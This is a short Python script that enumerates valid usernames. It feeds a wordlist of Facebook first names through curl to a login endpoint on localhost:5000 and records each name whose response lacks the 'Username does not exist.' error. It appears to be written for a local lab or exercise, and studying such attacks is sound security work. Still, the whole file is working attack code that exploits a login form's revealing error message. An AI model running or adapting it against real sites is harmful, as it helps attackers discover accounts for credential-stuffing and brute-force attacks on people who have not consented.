import subprocess
import io
import os

usernameCandidateListFile = "facebook-firstnames.txt"
usernameCandidate         = io.open(usernameCandidateListFile, "r", encoding="utf_8")
lines                     = usernameCandidate.readlines()
errMsg                    = "Username does not exist."
outputText                = io.open("output.txt","w")
attempt                   = 0;

print("Finding valid username...")

for username in lines:
   attempt   += 1
   postLogin  = ["curl", "-F", "username="+username.rstrip('\n'), "-F", "password=un", "localhost:5000/login"]
   curlOutput = subprocess.check_output(postLogin, stderr=subprocess.STDOUT)
   if attempt == 1000:
       print(str(attempt) + "th attempt, tring: " + username.rstrip('\n')) 
   if curlOutput.find(errMsg) == -1 :
       print("Username found:" + username)
       outputText.write(username)
